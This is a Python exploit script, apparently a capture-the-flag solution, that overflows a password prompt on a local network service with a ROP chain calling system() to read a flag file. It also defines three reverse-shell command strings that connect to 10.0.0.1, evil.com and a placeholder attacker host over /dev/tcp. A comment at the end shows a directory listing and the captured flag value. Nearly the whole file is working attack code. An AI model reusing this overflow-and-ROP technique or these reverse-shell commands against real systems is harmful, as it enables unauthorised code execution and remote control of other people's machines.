import struct
import socket
import time

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 4444))
#s = socket.create_connection(('192.168.248.129', 4444))

read_function_adddress = 0x0804856C
system = 0x0804850C
dream = 0x08048AC5
command_address = 0x08049ED0
pop_2c_address = 0x080489F6
pop_ret_address = 0x080487A3

reverse_shell_command = 'bash -i >& /dev/tcp/10.0.0.1/8181 0>&1\n'
reverse_shell_command1 = ' exec 5<>/dev/tcp/evil.com/8080\n'
reverse_shell_command2 = '/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1\n'

cat_flag = 'cat /home/flag/flag.txt >n /tmp/anyuh\n\x00'
#cat_flag = 'cat /home/huyna/flag.txt > /tmp/anyuh\n\x00'
rop = [
    read_function_adddress,
    pop_2c_address,
    0x4,
    command_address,
    len(cat_flag),
    system,
    system,
    command_address,
    command_address,
    command_address
]
rop = convert_format(rop)

rop1 = [
    pop_2c_address,
    pop_2c_address,
    pop_2c_address
]
rop1 = convert_format(rop1)
first = '5e93de3efa544e85dcd6311732d28f95' + 'a' * (0x74 + 4 - 32)
sign = '5e93de3efa544e85dcd6311732d28f95'
aaa = sign+((len(first)-len(sign))/4)*pi(pop_ret_address)

payload = '5e93de3efa544e85dcd6311732d28f95' + 'a' * (0x74 + 4 - 32) + rop1 + '\n'

payload = aaa + 34*pi(pop_ret_address)+pi(0x080489F8)+pi(0x00)+rop

payload = payload + 'c'*(1024-len(payload))+cat_flag

print recv_until(s, 'enter passord: ')
time.sleep(0.001)
s.send(payload)
print s.recv(100)

time.sleep(0.001)
s.send(cat_flag)

'''
-rw-rw-r--. 1 flag flag   33 Nov 21 07:33 a1
-rw-rw-r--. 1 flag flag    0 Nov 21 07:03 anyuh
-rw-r--r--. 1 ctf  ctf  2117 Nov 21 07:30 exp1-cssamp-2014.py
-rw-rw-r--. 1 flag flag   10 Nov 21 07:14 hello
-r--------. 1 flag ctf     0 Nov 20 18:47 maybe
-rwxrwxr-x. 1 ctf  ctf   254 Nov 21 07:33 sploit.py
-rw-------. 1 root root    0 Nov 20 12:13 yum.log
-bash-4.1$ cat a1
76a2173be6393254e72ffa4d6df1030a
'''